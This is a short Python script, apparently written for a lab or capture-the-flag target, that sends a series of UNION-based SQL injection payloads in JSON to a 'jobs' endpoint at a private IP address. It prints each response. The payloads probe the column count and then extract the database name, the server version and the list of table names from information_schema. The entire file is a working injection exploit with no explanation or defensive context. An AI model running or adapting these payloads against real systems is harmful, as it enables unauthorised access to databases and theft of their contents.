import requests

TARGET_URL = "http://10.0.162.112:80/jobs"

def main():
    payloads = [
        {"type": "front-end' UNION SELECT 1,2,3,4--"},
        {"type": "front-end' UNION SELECT 1,database(),3,4--"},
        {"type": "front-end' UNION SELECT 1,version(),3,4--"},
        {"type": "front-end' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--"}
    ]
    
    session = requests.Session()
    
    for i, payload in enumerate(payloads, 1):
        print(f"[*] Sending Payload {i}: {payload}")
        try:
            response = session.post(TARGET_URL, json=payload, timeout=10)
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Response Content:")
            print(response.text)
            print("-" * 80)
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed for payload {i}: {e}")
            print("-" * 80)

if __name__ == "__main__":
    main()